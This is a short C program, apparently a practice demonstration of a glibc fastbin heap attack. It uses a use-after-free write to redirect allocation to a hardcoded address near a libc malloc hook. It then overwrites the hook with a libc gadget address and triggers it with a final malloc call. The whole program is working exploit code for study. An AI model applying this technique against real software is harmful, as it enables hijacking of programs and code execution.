int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd472d+0x8-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);

    *(long long *)(chunk_a + 0x3) = 0x431ac + 0x7ffff7a0d000;

    chunk1 = malloc(0x1);
    return 0;
}
